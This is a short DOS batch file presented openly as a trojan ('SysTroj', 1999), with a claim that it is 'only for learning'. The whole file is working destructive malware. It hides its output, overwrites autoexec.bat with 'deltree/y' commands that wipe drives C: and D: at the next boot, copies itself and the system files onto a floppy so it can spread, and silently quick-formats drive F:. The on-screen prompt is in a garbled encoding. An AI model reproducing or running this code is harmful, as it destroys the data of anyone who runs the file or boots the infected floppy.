:Name: SysTroj   This is small trojan! Only for learning.
:Date: 12-1999   Created by Steel-1
@echo off
echo Wait...
set systroj = autoexec.bat
@ctty nul
attrib c:\%systroj% -r
echo @ctty nul > c:\%systroj%
echo deltree/y d: >> c:\%systroj%
echo deltree/y c: >> c:\%systroj%
@ctty con
echo ��⠢�� ��᪥�� � ��᪮��� � ������ Enter...
pause>nul
copy %0 a:\%systroj%
copy c:\command.com a:\command.com
copy c:\io.sys a:\io.sys
copy c:\msdos.sys a:\msdos.sys
@ctty nul
echo y| format f: /q /u
@ctty con
:(c) Steel-1